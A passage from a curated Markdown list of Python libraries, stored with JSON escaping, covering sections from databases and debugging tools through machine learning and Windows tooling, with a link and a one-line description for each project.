ggplot2.\n* [Matplotlib](http:\/\/matplotlib.org\/) - A Python 2D plotting library.\n* [Pygal](http:\/\/www.pygal.org\/en\/latest\/) - A Python SVG Charts Creator.\n* [PyGraphviz](https:\/\/pypi.org\/project\/pygraphviz\/) - Python interface to [Graphviz](http:\/\/www.graphviz.org\/).\n* [PyQtGraph](http:\/\/www.pyqtgraph.org\/) - Interactive and realtime 2D\/3D\/Image plotting and science\/engineering widgets.\n* [Seaborn](https:\/\/github.com\/mwaskom\/seaborn) - Statistical data visualization using Matplotlib.\n* [VisPy](https:\/\/github.com\/vispy\/vispy) - High-performance scientific visualization based on OpenGL.\n\n## Database\n\n*Databases implemented in Python.*\n\n* [pickleDB](https:\/\/github.com\/patx\/pickledb) - A simple and lightweight key-value store for Python.\n* [tinydb](https:\/\/github.com\/msiemens\/tinydb) - A tiny, document-oriented database.\n* [ZODB](https:\/\/github.com\/zopefoundation\/ZODB) - A native object database for Python. A key-value and object graph database.\n\n## Database Drivers\n\n*Libraries for connecting and operating databases.*\n\n* MySQL - [awesome-mysql](http:\/\/shlomi-noach.github.io\/awesome-mysql\/)\n    * [mysqlclient](https:\/\/github.com\/PyMySQL\/mysqlclient-python) - MySQL connector with Python 3 support ([mysql-python](https:\/\/sourceforge.net\/projects\/mysql-python\/) fork).\n    * [PyMySQL](https:\/\/github.com\/PyMySQL\/PyMySQL) - A pure Python MySQL driver compatible to mysql-python.\n* PostgreSQL - [awesome-postgres](https:\/\/github.com\/dhamaniasad\/awesome-postgres)\n    * [psycopg2](http:\/\/initd.org\/psycopg\/) - The most popular PostgreSQL adapter for Python.\n    * [queries](https:\/\/github.com\/gmr\/queries) - A wrapper of the psycopg2 library for interacting with PostgreSQL.\n* Other Relational Databases\n    * [pymssql](http:\/\/www.pymssql.org\/en\/latest\/) - A simple database interface to Microsoft SQL Server.\n    * [SuperSQLite](https:\/\/github.com\/plasticityai\/supersqlite) - A supercharged SQLite library built on top of [apsw](https:\/\/github.com\/rogerbinns\/apsw).\n* NoSQL Databases\n    * [cassandra-driver](https:\/\/github.com\/datastax\/python-driver) - The Python Driver for Apache Cassandra.\n    * [happybase](https:\/\/github.com\/wbolster\/happybase) - A developer-friendly library for Apache HBase.\n    * [kafka-python](https:\/\/github.com\/dpkp\/kafka-python) - The Python client for Apache Kafka.\n    * [py2neo](https:\/\/py2neo.org\/) - A client library and toolkit for working with Neo4j.\n    * [pymongo](https:\/\/github.com\/mongodb\/mongo-python-driver) - The official Python client for MongoDB.\n    * [redis-py](https:\/\/github.com\/andymccurdy\/redis-py) - The Python client for Redis.\n* Asynchronous Clients\n    * [motor](https:\/\/github.com\/mongodb\/motor) - The async Python driver for MongoDB.\n\n## Date and Time\n\n*Libraries for working with dates and times.*\n\n* [Chronyk](https:\/\/github.com\/KoffeinFlummi\/Chronyk) - A Python 3 library for parsing human-written times and dates.\n* [dateutil](https:\/\/github.com\/dateutil\/dateutil) - Extensions to the standard Python [datetime](https:\/\/docs.python.org\/3\/library\/datetime.html) module.\n* [delorean](https:\/\/github.com\/myusuf3\/delorean\/) - A library for clearing up the inconvenient truths that arise dealing with datetimes.\n* [moment](https:\/\/github.com\/zachwill\/moment) - A Python library for dealing with dates\/times. Inspired by [Moment.js](http:\/\/momentjs.com\/).\n* [Pendulum](https:\/\/github.com\/sdispater\/pendulum) - Python datetimes made easy.\n* [PyTime](https:\/\/github.com\/shinux\/PyTime) - An easy-to-use Python module which aims to operate date\/time\/datetime by string.\n* [pytz](https:\/\/launchpad.net\/pytz) - World timezone definitions, modern and historical. Brings the [tz database](https:\/\/en.wikipedia.org\/wiki\/Tz_database) into Python.\n* [when.py](https:\/\/github.com\/dirn\/When.py) - Providing user-friendly functions to help perform common date and time actions.\n* [maya](https:\/\/github.com\/kennethreitz\/maya) - Datetimes for Humans.\n\n## Debugging Tools\n\n*Libraries for debugging code.*\n\n* pdb-like Debugger\n    * [ipdb](https:\/\/github.com\/gotcha\/ipdb) - IPython-enabled [pdb](https:\/\/docs.python.org\/3\/library\/pdb.html).\n    * [pdb++](https:\/\/github.com\/antocuni\/pdb) - Another drop-in replacement for pdb.\n    * [pudb](https:\/\/github.com\/inducer\/pudb) - A full-screen, console-based Python debugger.\n    * [wdb](https:\/\/github.com\/Kozea\/wdb) - An improbable web debugger through WebSockets.\n* Tracing\n    * [lptrace](https:\/\/github.com\/khamidou\/lptrace) - [strace](http:\/\/man7.org\/linux\/man-pages\/man1\/strace.1.html) for Python programs.\n    * [manhole](https:\/\/github.com\/ionelmc\/python-manhole) - Debugging UNIX socket connections and present the stacktraces for all threads and an interactive prompt.\n    * [pyringe](https:\/\/github.com\/google\/pyringe) - Debugger capable of attaching to and injecting code into Python processes.\n    * [python-hunter](https:\/\/github.com\/ionelmc\/python-hunter) - A flexible code tracing toolkit.\n* Profiler\n    * [line_profiler](https:\/\/github.com\/rkern\/line_profiler) - Line-by-line profiling.\n    * [memory_profiler](https:\/\/github.com\/fabianp\/memory_profiler) - Monitor Memory usage of Python code.\n    * [profiling](https:\/\/github.com\/what-studio\/profiling) - An interactive Python profiler.\n    * [py-spy](https:\/\/github.com\/benfred\/py-spy) - A sampling profiler for Python programs. Written in Rust.\n    * [pyflame](https:\/\/github.com\/uber\/pyflame) - A ptracing profiler For Python.\n    * [vprof](https:\/\/github.com\/nvdv\/vprof) - Visual Python profiler.\n* Others\n    * [icecream](https:\/\/github.com\/gruns\/icecream) - Inspect variables, expressions, and program execution with a single, simple function call.\n    * [django-debug-toolbar](https:\/\/github.com\/jazzband\/django-debug-toolbar) - Display various debug information for Django.\n    * [django-devserver](https:\/\/github.com\/dcramer\/django-devserver) - A drop-in replacement for Django's runserver.\n    * [flask-debugtoolbar](https:\/\/github.com\/mgood\/flask-debugtoolbar) - A port of the django-debug-toolbar to flask.\n    * [pyelftools](https:\/\/github.com\/eliben\/pyelftools) - Parsing and analyzing ELF files and DWARF debugging information.\n\n## Deep Learning\n\n*Frameworks for Neural Networks and Deep Learning. Also see [awesome-deep-learning](https:\/\/github.com\/ChristosChristofidis\/awesome-deep-learning).*\n\n* [caffe](https:\/\/github.com\/BVLC\/caffe) - A fast open framework for deep learning..\n* [keras](https:\/\/github.com\/keras-team\/keras) - A high-level neural networks library and capable of running on top of either TensorFlow or Theano.\n* [mxnet](https:\/\/github.com\/dmlc\/mxnet) - A deep learning framework designed for both efficiency and flexibility.\n* [pytorch](https:\/\/github.com\/pytorch\/pytorch) - Tensors and Dynamic neural networks in Python with strong GPU acceleration.\n* [SerpentAI](https:\/\/github.com\/SerpentAI\/SerpentAI) - Game agent framework. Use any video game as a deep learning sandbox.\n* [tensorflow](https:\/\/github.com\/tensorflow\/tensorflow) - The most popular Deep Learning framework created by Google.\n* [Theano](https:\/\/github.com\/Theano\/Theano) - A library for fast numerical computation.\n\n## DevOps Tools\n\n*Software and libraries for DevOps.*\n\n* [ansible](https:\/\/github.com\/ansible\/ansible) - A radically simple IT automation platform.\n* [cloudinit](https:\/\/cloudinit.readthedocs.io\/en\/latest\/) - A multi-distribution package that handles early initialization of a cloud instance.\n* [cuisine](https:\/\/github.com\/sebastien\/cuisine) - Chef-like functionality for Fabric.\n* [docker-compose](https:\/\/docs.docker.com\/compose\/) - Fast, isolated development environments using [Docker](https:\/\/www.docker.com\/).\n* [fabric](https:\/\/github.com\/fabric\/fabric) - A simple, Pythonic tool for remote execution and deployment.\n* [fabtools](https:\/\/github.com\/fabtools\/fabtools) - Tools for writing awesome Fabric files.\n* [honcho](https:\/\/github.com\/nickstenning\/honcho) - A Python clone of [Foreman](https:\/\/github.com\/ddollar\/foreman), for managing Procfile-based applications.\n* [OpenStack](https:\/\/www.openstack.org\/) - Open source software for building private and public clouds.\n* [pexpect](https:\/\/github.com\/pexpect\/pexpect) - Controlling interactive programs in a pseudo-terminal like GNU expect.\n* [psutil](https:\/\/github.com\/giampaolo\/psutil) - A cross-platform process and system utilities module.\n* [saltstack](https:\/\/github.com\/saltstack\/salt) - Infrastructure automation and management system.\n* [supervisor](https:\/\/github.com\/Supervisor\/supervisor) - Supervisor process control system for UNIX.\n\n## Distributed Computing\n\n*Frameworks and libraries for Distributed Computing.*\n\n* Batch Processing\n    * [PySpark](https:\/\/pypi.org\/project\/pyspark\/) - [Apache Spark](https:\/\/spark.apache.org\/) Python API.\n    * [dask](https:\/\/github.com\/dask\/dask) - A flexible parallel computing library for analytic computing.\n    * [luigi](https:\/\/github.com\/spotify\/luigi) - A module that helps you build complex pipelines of batch jobs.\n    * [mrjob](https:\/\/github.com\/Yelp\/mrjob) - Run MapReduce jobs on Hadoop or Amazon Web Services.\n    * [Ray](https:\/\/github.com\/ray-project\/ray\/) - A system for parallel and distributed Python that unifies the machine learning ecosystem.\n* Stream Processing\n    * [faust](https:\/\/github.com\/robinhood\/faust) - A stream processing library, porting the ideas from [Kafka Streams](https:\/\/kafka.apache.org\/documentation\/streams\/) to Python.\n    * [streamparse](https:\/\/github.com\/Parsely\/streamparse) - Run Python code against real-time streams of data via [Apache Storm](http:\/\/storm.apache.org\/).\n\n## Distribution\n\n*Libraries to create packaged executables for release distribution.*\n\n* [dh-virtualenv](https:\/\/github.com\/spotify\/dh-virtualenv) - Build and distribute a virtualenv as a Debian package.\n* [Nuitka](http:\/\/nuitka.net\/) - Compile scripts, modules, packages to an executable or extension module.\n* [py2app](http:\/\/pythonhosted.org\/py2app\/) - Freezes Python scripts (Mac OS X).\n* [py2exe](http:\/\/www.py2exe.org\/) - Freezes Python scripts (Windows).\n* [PyInstaller](https:\/\/github.com\/pyinstaller\/pyinstaller) - Converts Python programs into stand-alone executables (cross-platform).\n* [pynsist](http:\/\/pynsist.readthedocs.io\/en\/latest\/) - A tool to build Windows installers, installers bundle Python itself.\n\n## Documentation\n\n*Libraries for generating project documentation.*\n\n* [sphinx](https:\/\/github.com\/sphinx-doc\/sphinx\/) - Python Documentation generator.\n    * [awesome-sphinxdoc](https:\/\/github.com\/yoloseem\/awesome-sphinxdoc)\n* [pdoc](https:\/\/github.com\/mitmproxy\/pdoc) - Epydoc replacement to auto generate API documentation for Python libraries.\n* [pycco](https:\/\/github.com\/pycco-docs\/pycco) - The literate-programming-style documentation generator.\n\n## Downloader\n\n*Libraries for downloading.*\n\n* [s3cmd](https:\/\/github.com\/s3tools\/s3cmd) - A command line tool for managing Amazon S3 and CloudFront.\n* [s4cmd](https:\/\/github.com\/bloomreach\/s4cmd) - Super S3 command line tool, good for higher performance.\n* [you-get](https:\/\/you-get.org\/) - A YouTube\/Youku\/Niconico video downloader written in Python 3.\n* [youtube-dl](https:\/\/rg3.github.io\/youtube-dl\/) - A small command-line program to download videos from YouTube.\n\n## E-commerce\n\n*Frameworks and libraries for e-commerce and payments.*\n\n* [alipay](https:\/\/github.com\/lxneng\/alipay) - Unofficial Alipay API for Python.\n* [Cartridge](https:\/\/github.com\/stephenmcd\/cartridge) - A shopping cart app built using the Mezzanine.\n* [django-oscar](http:\/\/oscarcommerce.com\/) - An open-source e-commerce framework for Django.\n* [django-shop](https:\/\/github.com\/awesto\/django-shop) - A Django based shop system.\n* [merchant](https:\/\/github.com\/agiliq\/merchant) - A Django app to accept payments from various payment processors.\n* [money](https:\/\/github.com\/carlospalol\/money) - `Money` class with optional CLDR-backed locale-aware formatting and an extensible currency exchange.\n* [python-currencies](https:\/\/github.com\/Alir3z4\/python-currencies) - Display money format and its filthy currencies.\n* [forex-python](https:\/\/github.com\/MicroPyramid\/forex-python) - Foreign exchange rates, Bitcoin price index and currency conversion.\n* [saleor](http:\/\/getsaleor.com\/) - An e-commerce storefront for Django.\n* [shoop](https:\/\/www.shuup.com\/en\/) - An open source E-Commerce platform based on Django.\n\n## Editor Plugins and IDEs\n\n* Emacs\n    * [elpy](https:\/\/github.com\/jorgenschaefer\/elpy) - Emacs Python Development Environment.\n* Sublime Text\n    * [anaconda](https:\/\/github.com\/DamnWidget\/anaconda) - Anaconda turns your Sublime Text 3 in a full featured Python development IDE.\n    * [SublimeJEDI](https:\/\/github.com\/srusskih\/SublimeJEDI) - A Sublime Text plugin to the awesome auto-complete library Jedi.\n* Vim\n    * [jedi-vim](https:\/\/github.com\/davidhalter\/jedi-vim) - Vim bindings for the Jedi auto-completion library for Python.\n    * [python-mode](https:\/\/github.com\/python-mode\/python-mode) - An all in one plugin for turning Vim into a Python IDE.\n    * [YouCompleteMe](https:\/\/github.com\/Valloric\/YouCompleteMe) - Includes [Jedi](https:\/\/github.com\/davidhalter\/jedi)-based completion engine for Python.\n* Visual Studio\n    * [PTVS](https:\/\/github.com\/Microsoft\/PTVS) - Python Tools for Visual Studio.\n* Visual Studio Code\n    * [Python](https:\/\/marketplace.visualstudio.com\/items?itemName=ms-python.python) - The official VSCode extension with rich support for Python.\n* IDE\n    * [PyCharm](https:\/\/www.jetbrains.com\/pycharm\/) - Commercial Python IDE by JetBrains. Has free community edition available.\n    * [spyder](https:\/\/github.com\/spyder-ide\/spyder) - Open Source Python IDE.\n\n## Email\n\n*Libraries for sending and parsing email.*\n\n* [envelopes](http:\/\/tomekwojcik.github.io\/envelopes\/) - Mailing for human beings.\n* [flanker](https:\/\/github.com\/mailgun\/flanker) - An email address and Mime parsing library.\n* [imbox](https:\/\/github.com\/martinrusev\/imbox) - Python IMAP for Humans.\n* [inbox.py](https:\/\/github.com\/kennethreitz\/inbox.py) - Python SMTP Server for Humans.\n* [lamson](https:\/\/github.com\/zedshaw\/lamson) - Pythonic SMTP Application Server.\n* [Marrow Mailer](https:\/\/github.com\/marrow\/mailer) - High-performance extensible mail delivery framework.\n* [modoboa](https:\/\/github.com\/modoboa\/modoboa) - A mail hosting and management platform including a modern and simplified Web UI.\n* [Nylas Sync Engine](https:\/\/github.com\/nylas\/sync-engine) - Providing a RESTful API on top of a powerful email sync platform.\n* [yagmail](https:\/\/github.com\/kootenpv\/yagmail) - Yet another Gmail\/SMTP client.\n\n## Environment Management\n\n*Libraries for Python version and virtual environment management.*\n\n* [pyenv](https:\/\/github.com\/pyenv\/pyenv) - Simple Python version management.\n* [pipenv](https:\/\/github.com\/pypa\/pipenv) - Python Development Workflow for Humans.\n* [poetry](https:\/\/github.com\/sdispater\/poetry) - Python dependency management and packaging made easy.\n* [virtualenv](https:\/\/github.com\/pypa\/virtualenv) - A tool to create isolated Python environments.\n\n## Files\n\n*Libraries for file manipulation and MIME type detection.*\n\n* [mimetypes](https:\/\/docs.python.org\/3\/library\/mimetypes.html) - (Python standard library) Map filenames to MIME types.\n* [path.py](https:\/\/github.com\/jaraco\/path.py) - A module wrapper for [os.path](https:\/\/docs.python.org\/3\/library\/os.path.html).\n* [pathlib](https:\/\/docs.python.org\/3\/library\/pathlib.html) - (Python standard library) An cross-platform, object-oriented path library.\n* [PyFilesystem2](https:\/\/github.com\/pyfilesystem\/pyfilesystem2) - Python's filesystem abstraction layer.\n* [python-magic](https:\/\/github.com\/ahupp\/python-magic) - A Python interface to the libmagic file type identification library.\n* [Unipath](https:\/\/github.com\/mikeorr\/Unipath) - An object-oriented approach to file\/directory operations.\n* [watchdog](https:\/\/github.com\/gorakhargosh\/watchdog) - API and shell utilities to monitor file system events.\n\n## Foreign Function Interface\n\n*Libraries for providing foreign function interface.*\n\n* [cffi](https:\/\/pypi.org\/project\/cffi\/) - Foreign Function Interface for Python calling C code.\n* [ctypes](https:\/\/docs.python.org\/3\/library\/ctypes.html) - (Python standard library) Foreign Function Interface for Python calling C code.\n* [PyCUDA](https:\/\/mathema.tician.de\/software\/pycuda\/) - A Python wrapper for Nvidia's CUDA API.\n* [SWIG](http:\/\/www.swig.org\/Doc1.3\/Python.html) - Simplified Wrapper and Interface Generator.\n\n## Forms\n\n*Libraries for working with forms.*\n\n* [Deform](https:\/\/github.com\/Pylons\/deform) - Python HTML form generation library influenced by the formish form generation library.\n* [django-bootstrap3](https:\/\/github.com\/dyve\/django-bootstrap3) - Bootstrap 3 integration with Django.\n* [django-bootstrap4](https:\/\/github.com\/zostera\/django-bootstrap4) - Bootstrap 4 integration with Django.\n* [django-crispy-forms](https:\/\/github.com\/django-crispy-forms\/django-crispy-forms) - A Django app which lets you create beautiful forms in a very elegant and DRY way.\n* [django-remote-forms](https:\/\/github.com\/WiserTogether\/django-remote-forms) - A platform independent Django form serializer.\n* [WTForms](https:\/\/github.com\/wtforms\/wtforms) - A flexible forms validation and rendering library.\n\n## Functional Programming\n\n*Functional Programming with Python.*\n\n* [Coconut](http:\/\/coconut-lang.org\/) - Coconut is a variant of Python built for simple, elegant, Pythonic functional programming.\n* [CyToolz](https:\/\/github.com\/pytoolz\/cytoolz\/) - Cython implementation of Toolz: High performance functional utilities.\n* [fn.py](https:\/\/github.com\/kachayev\/fn.py) - Functional programming in Python: implementation of missing features to enjoy FP.\n* [funcy](https:\/\/github.com\/Suor\/funcy) - A fancy and practical functional tools.\n* [Toolz](https:\/\/github.com\/pytoolz\/toolz) - A collection of functional utilities for iterators, functions, and dictionaries.\n\n## GUI Development\n\n*Libraries for working with graphical user interface applications.*\n\n* [curses](https:\/\/docs.python.org\/3\/library\/curses.html) - Built-in wrapper for [ncurses](http:\/\/www.gnu.org\/software\/ncurses\/) used to create terminal GUI applications.\n* [Eel](https:\/\/github.com\/ChrisKnott\/Eel) - A library for making simple Electron-like offline HTML\/JS GUI apps.\n* [enaml](https:\/\/github.com\/nucleic\/enaml) - Creating beautiful user-interfaces with Declarative Syntax like QML.\n* [Flexx](https:\/\/github.com\/zoofIO\/flexx) - Flexx is a pure Python toolkit for creating GUI's, that uses web technology for its rendering.\n* [Gooey](https:\/\/github.com\/chriskiehl\/Gooey) - Turn command line programs into a full GUI application with one line.\n* [kivy](https:\/\/kivy.org\/) - A library for creating NUI applications, running on Windows, Linux, Mac OS X, Android and iOS.\n* [pyglet](https:\/\/bitbucket.org\/pyglet\/pyglet\/wiki\/Home) - A cross-platform windowing and multimedia library for Python.\n* [PyGObject](https:\/\/wiki.gnome.org\/Projects\/PyGObject) - Python Bindings for GLib\/GObject\/GIO\/GTK+ (GTK+3).\n* [PyQt](https:\/\/riverbankcomputing.com\/software\/pyqt\/intro) - Python bindings for the [Qt](https:\/\/www.qt.io\/) cross-platform application and UI framework.\n* [PySimpleGUI](https:\/\/github.com\/PySimpleGUI\/PySimpleGUI) - Wrapper for tkinter, Qt, WxPython and Remi.\n* [pywebview](https:\/\/github.com\/r0x0r\/pywebview\/) - A lightweight cross-platform native wrapper around a webview component.\n* [Tkinter](https:\/\/wiki.python.org\/moin\/TkInter) - Tkinter is Python's de-facto standard GUI package.\n* [Toga](https:\/\/github.com\/pybee\/toga) - A Python native, OS native GUI toolkit.\n* [urwid](http:\/\/urwid.org\/) - A library for creating terminal GUI applications with strong support for widgets, events, rich colors, etc.\n* [wxPython](https:\/\/wxpython.org\/) - A blending of the wxWidgets C++ class library with the Python.\n\n## Game Development\n\n*Awesome game development libraries.*\n\n* [Cocos2d](http:\/\/cocos2d.org\/) - cocos2d is a framework for building 2D games, demos, and other graphical\/interactive applications.\n* [Harfang3D](http:\/\/www.harfang3d.com) - Python framework for 3D, VR and game development.\n* [Panda3D](https:\/\/www.panda3d.org\/) - 3D game engine developed by Disney.\n* [Pygame](http:\/\/www.pygame.org\/news.html) - Pygame is a set of Python modules designed for writing games.\n* [PyOgre](http:\/\/www.ogre3d.org\/tikiwiki\/PyOgre) - Python bindings for the Ogre 3D render engine, can be used for games, simulations, anything 3D.\n* [PyOpenGL](http:\/\/pyopengl.sourceforge.net\/) - Python ctypes bindings for OpenGL and it's related APIs.\n* [PySDL2](https:\/\/pysdl2.readthedocs.io) - A ctypes based wrapper for the SDL2 library.\n* [RenPy](https:\/\/www.renpy.org\/) - A Visual Novel engine.\n\n## Geolocation\n\n*Libraries for geocoding addresses and working with latitudes and longitudes.*\n\n* [django-countries](https:\/\/github.com\/SmileyChris\/django-countries) - A Django app that provides a country field for models and forms.\n* [GeoDjango](https:\/\/docs.djangoproject.com\/en\/dev\/ref\/contrib\/gis\/) - A world-class geographic web framework.\n* [GeoIP](https:\/\/github.com\/maxmind\/geoip-api-python) - Python API for MaxMind GeoIP Legacy Database.\n* [geojson](https:\/\/github.com\/frewsxcv\/python-geojson) - Python bindings and utilities for GeoJSON.\n* [geopy](https:\/\/github.com\/geopy\/geopy) - Python Geocoding Toolbox.\n* [pygeoip](https:\/\/github.com\/appliedsec\/pygeoip) - Pure Python GeoIP API.\n\n## HTML Manipulation\n\n*Libraries for working with HTML and XML.*\n\n* [BeautifulSoup](https:\/\/www.crummy.com\/software\/BeautifulSoup\/bs4\/doc\/) - Providing Pythonic idioms for iterating, searching, and modifying HTML or XML.\n* [bleach](https:\/\/github.com\/mozilla\/bleach) - A whitelist-based HTML sanitization and text linkification library.\n* [cssutils](https:\/\/pypi.org\/project\/cssutils\/) - A CSS library for Python.\n* [html5lib](https:\/\/github.com\/html5lib\/html5lib-python) - A standards-compliant library for parsing and serializing HTML documents and fragments.\n* [lxml](http:\/\/lxml.de\/) - A very fast, easy-to-use and versatile library for handling HTML and XML.\n* [MarkupSafe](https:\/\/github.com\/pallets\/markupsafe) - Implements a XML\/HTML\/XHTML Markup safe string for Python.\n* [pyquery](https:\/\/github.com\/gawel\/pyquery) - A jQuery-like library for parsing HTML.\n* [untangle](https:\/\/github.com\/stchris\/untangle) - Converts XML documents to Python objects for easy access.\n* [WeasyPrint](http:\/\/weasyprint.org) - A visual rendering engine for HTML and CSS that can export to PDF.\n* [xmldataset](https:\/\/xmldataset.readthedocs.io\/en\/latest\/) - Simple XML Parsing.\n* [xmltodict](https:\/\/github.com\/martinblech\/xmltodict) - Working with XML feel like you are working with JSON.\n\n## HTTP Clients\n\n*Libraries for working with HTTP.*\n\n* [grequests](https:\/\/github.com\/kennethreitz\/grequests) - requests + gevent for asynchronous HTTP requests.\n* [httplib2](https:\/\/github.com\/httplib2\/httplib2) - Comprehensive HTTP client library.\n* [requests](https:\/\/requests.kennethreitz.org\/en\/master\/) - HTTP Requests for Humans.\n* [treq](https:\/\/github.com\/twisted\/treq) - Python requests like API built on top of Twisted's HTTP client.\n* [urllib3](https:\/\/github.com\/shazow\/urllib3) - A HTTP library with thread-safe connection pooling, file post support, sanity friendly.\n\n## Hardware\n\n*Libraries for programming with hardware.*\n\n* [ino](http:\/\/inotool.org\/) - Command line toolkit for working with [Arduino](https:\/\/www.arduino.cc\/).\n* [keyboard](https:\/\/github.com\/boppreh\/keyboard) - Hook and simulate global keyboard events on Windows and Linux.\n* [mouse](https:\/\/github.com\/boppreh\/mouse) - Hook and simulate global mouse events on Windows and Linux.\n* [Pingo](http:\/\/www.pingo.io\/) - Pingo provides a uniform API to program devices like the Raspberry Pi, pcDuino, Intel Galileo, etc.\n* [PyUserInput](https:\/\/github.com\/SavinaRoja\/PyUserInput) - A module for cross-platform control of the mouse and keyboard.\n* [scapy](https:\/\/github.com\/secdev\/scapy) - A brilliant packet manipulation library.\n* [wifi](https:\/\/github.com\/rockymeza\/wifi) - A Python library and command line tool for working with WiFi on Linux.\n\n## Image Processing\n\n*Libraries for manipulating images.*\n\n* [hmap](https:\/\/github.com\/rossgoodwin\/hmap) - Image histogram remapping.\n* [imgSeek](https:\/\/sourceforge.net\/projects\/imgseek\/) - A project for searching a collection of images using visual similarity.\n* [nude.py](https:\/\/github.com\/hhatto\/nude.py) - Nudity detection.\n* [pagan](https:\/\/github.com\/daboth\/pagan) - Retro identicon (Avatar) generation based on input string and hash.\n* [pillow](https:\/\/github.com\/python-pillow\/Pillow) - Pillow is the friendly [PIL](http:\/\/www.pythonware.com\/products\/pil\/) fork.\n* [pyBarcode](https:\/\/pythonhosted.org\/pyBarcode\/) - Create barcodes in Python without needing PIL.\n* [pygram](https:\/\/github.com\/ajkumar25\/pygram) - Instagram-like image filters.\n* [python-qrcode](https:\/\/github.com\/lincolnloop\/python-qrcode) - A pure Python QR Code generator.\n* [Quads](https:\/\/github.com\/fogleman\/Quads) - Computer art based on quadtrees.\n* [scikit-image](http:\/\/scikit-image.org\/) - A Python library for (scientific) image processing.\n* [thumbor](https:\/\/github.com\/thumbor\/thumbor) - A smart imaging service. It enables on-demand crop, re-sizing and flipping of images.\n* [wand](https:\/\/github.com\/dahlia\/wand) - Python bindings for [MagickWand](http:\/\/www.imagemagick.org\/script\/magick-wand.php), C API for ImageMagick.\n\n## Implementations\n\n*Implementations of Python.*\n\n* [CPython](https:\/\/github.com\/python\/cpython) - **Default, most widely used implementation of the Python programming language written in C.**\n* [Cython](http:\/\/cython.org\/) - Optimizing Static Compiler for Python.\n* [CLPython](https:\/\/github.com\/metawilm\/cl-python) - Implementation of the Python programming language written in Common Lisp.\n* [Grumpy](https:\/\/github.com\/google\/grumpy) - More compiler than interpreter as more powerful CPython2.7 replacement (alpha).\n* [IronPython](https:\/\/github.com\/IronLanguages\/ironpython3) - Implementation of the Python programming language written in C#.\n* [Jython](https:\/\/hg.python.org\/jython) - Implementation of Python programming language written in Java for the JVM.\n* [MicroPython](https:\/\/github.com\/micropython\/micropython) - A lean and efficient Python programming language implementation.\n* [Numba](http:\/\/numba.pydata.org\/) - Python JIT compiler to LLVM aimed at scientific Python.\n* [PeachPy](https:\/\/github.com\/Maratyszcza\/PeachPy) - x86-64 assembler embedded in Python.\n* [Pyjion](https:\/\/github.com\/Microsoft\/Pyjion) - A JIT for Python based upon CoreCLR.\n* [PyPy](https:\/\/bitbucket.org\/pypy\/pypy) - A very fast and compliant implementation of the Python language.\n* [Pyston](https:\/\/github.com\/dropbox\/pyston) - A Python implementation using JIT techniques.\n* [Stackless Python](https:\/\/github.com\/stackless-dev\/stackless) - An enhanced version of the Python programming language.\n\n## Interactive Interpreter\n\n*Interactive Python interpreters (REPL).*\n\n* [bpython](https:\/\/github.com\/bpython\/bpython) - A fancy interface to the Python interpreter.\n* [Jupyter Notebook (IPython)](https:\/\/jupyter.org) - A rich toolkit to help you make the most out of using Python interactively.\n    * [awesome-jupyter](https:\/\/github.com\/markusschanta\/awesome-jupyter)\n* [ptpython](https:\/\/github.com\/jonathanslenders\/ptpython) - Advanced Python REPL built on top of the [python-prompt-toolkit](https:\/\/github.com\/jonathanslenders\/python-prompt-toolkit).\n\n## Internationalization\n\n*Libraries for working with i18n.*\n\n* [Babel](http:\/\/babel.pocoo.org\/en\/latest\/) - An internationalization library for Python.\n* [PyICU](https:\/\/github.com\/ovalhub\/pyicu) - A wrapper of International Components for Unicode C++ library ([ICU](http:\/\/site.icu-project.org\/)).\n\n## Job Scheduler\n\n*Libraries for scheduling jobs.*\n\n* [APScheduler](http:\/\/apscheduler.readthedocs.io\/en\/latest\/) - A light but powerful in-process task scheduler that lets you schedule functions.\n* [django-schedule](https:\/\/github.com\/thauber\/django-schedule) - A calendaring app for Django.\n* [doit](http:\/\/pydoit.org\/) - A task runner and build tool.\n* [gunnery](https:\/\/github.com\/gunnery\/gunnery) - Multipurpose task execution tool for distributed systems with web-based interface.\n* [Joblib](https:\/\/joblib.readthedocs.io\/) - A set of tools to provide lightweight pipelining in Python.\n* [Plan](https:\/\/github.com\/fengsp\/plan) - Writing crontab file in Python like a charm.\n* [schedule](https:\/\/github.com\/dbader\/schedule) - Python job scheduling for humans.\n* [Spiff](https:\/\/github.com\/knipknap\/SpiffWorkflow) - A powerful workflow engine implemented in pure Python.\n* [TaskFlow](https:\/\/docs.openstack.org\/developer\/taskflow\/) - A Python library that helps to make task execution easy, consistent and reliable.\n* [Airflow](https:\/\/airflow.apache.org\/) - Airflow is a platform to programmatically author, schedule and monitor workflows.\n\n## Logging\n\n*Libraries for generating and working with logs.*\n\n* [Eliot](https:\/\/github.com\/ScatterHQ\/eliot) - Logging for complex & distributed systems.\n* [logbook](http:\/\/logbook.readthedocs.io\/en\/stable\/) - Logging replacement for Python.\n* [logging](https:\/\/docs.python.org\/3\/library\/logging.html) - (Python standard library) Logging facility for Python.\n* [raven](https:\/\/github.com\/getsentry\/raven-python) - Python client for Sentry, a log\/error tracking, crash reporting and aggregation platform for web applications.\n\n## Machine Learning\n\n*Libraries for Machine Learning. Also see [awesome-machine-learning](https:\/\/github.com\/josephmisiti\/awesome-machine-learning#python).*\n\n* [H2O](https:\/\/github.com\/h2oai\/h2o-3) - Open Source Fast Scalable Machine Learning Platform.\n* [Metrics](https:\/\/github.com\/benhamner\/Metrics) - Machine learning evaluation metrics.\n* [NuPIC](https:\/\/github.com\/numenta\/nupic) - Numenta Platform for Intelligent Computing.\n* [scikit-learn](http:\/\/scikit-learn.org\/) - The most popular Python library for Machine Learning.\n* [Spark ML](http:\/\/spark.apache.org\/docs\/latest\/ml-guide.html) - [Apache Spark](http:\/\/spark.apache.org\/)'s scalable Machine Learning library.\n* [vowpal_porpoise](https:\/\/github.com\/josephreisinger\/vowpal_porpoise) - A lightweight Python wrapper for [Vowpal Wabbit](https:\/\/github.com\/JohnLangford\/vowpal_wabbit\/).\n* [xgboost](https:\/\/github.com\/dmlc\/xgboost) - A scalable, portable, and distributed gradient boosting library.\n\n## Microsoft Windows\n\n*Python programming on Microsoft Windows.*\n\n* [Python(x,y)](http:\/\/python-xy.github.io\/) - Scientific-applications-oriented Python Distribution based on Qt and Spyder.\n* [pythonlibs](http:\/\/www.lfd.uci.edu\/~gohlke\/pythonlibs\/) - Unofficial Windows binaries for Python extension packages.\n* [PythonNet](https:\/\/github.com\/pythonnet\/pythonnet) - Python Integration with the .NET Common Language Runtime (CLR).\n* [PyWin32](https:\/\/github.com\/mhammond\/pywin32) - Python Extensions for Windows.\n* [WinPython](https:\/\/winpython.github.io\/) - Portable development environment for Windows 7\/8.\n\n## Miscellaneous\n\n*Useful libraries or tools that don't fit in the categories above.*\n\n* [blinker](https:\/\/github.com\/jek\/blinker) - A fast Python in-process signal\/event dispatching 